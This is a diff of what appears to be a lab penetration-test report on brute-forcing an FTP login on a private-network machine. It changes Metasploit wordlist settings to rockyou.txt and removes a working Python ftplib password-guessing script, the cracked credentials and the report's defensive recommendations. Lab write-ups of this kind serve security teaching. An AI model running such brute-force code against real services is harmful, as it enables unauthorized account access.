@@ -58,9 +58,9 @@ The FTP service was chosen because it allows multiple login attempts, making it 
 
    ```bash
    set RHOSTS 10.0.2.16
-   set USER_FILE /usr/share/wordlists/ftp_users.txt
-   set PASS_FILE /usr/share/wordlists/ftp_passwords.txt
-   set THREADS 10
+   set USER_FILE /usr/share/wordlists/rockyou.txt
+   set PASS_FILE /usr/share/wordlists/rockyou.txt
+   set STOP_ON_SUCCESS true
    ```
 4. Execute the attack:
 
@@ -74,47 +74,3 @@ The FTP service was chosen because it allows multiple login attempts, making it 
 
 A Python script using `ftplib` was also used to automate login attempts:
 
-```python
-import ftplib
-
-def brute_ftp(host, users, passwords):
-    for user in open(users):
-        for pwd in open(passwords):
-            try:
-                ftp = ftplib.FTP(host)
-                ftp.login(user.strip(), pwd.strip())
-                print(f"[+] Success: {user.strip()}:{pwd.strip()}")
-                ftp.quit()
-                return
-            except Exception:
-                pass
-
-if __name__ == '__main__':
-    brute_ftp('10.0.2.16', 'ftp_users.txt', 'ftp_passwords.txt')
-```
-
-![Figure 5: FTP Brute-Force Script Example](image/Picture5.png)
-
-![Figure 6: Script Execution Output](image/b175ee04-b93f-44c5-804e-a121170c0c67.jpg)
-
----
-
-## 4. Results and Findings
-
-* **Successful Credentials Discovered:**
-  `ftpuser:ftp123`
-
-* **Access Achieved:** FTP shell access to the victim machine under `ftpuser` account.
-
----
-
-## 5. Recommendations
-
-1. **Implement Account Lockout:** Limit failed login attempts before locking an account.
-2. **Use Strong Passwords:** Enforce complexity requirements and periodic changes.
-3. **Enable Secure FTP:** Transition to FTPS or SFTP to protect credentials.
-4. **Audit Logs:** Monitor authentication logs for repeated failures.
-
----
-
-*Report generated on May 3, 2025.*
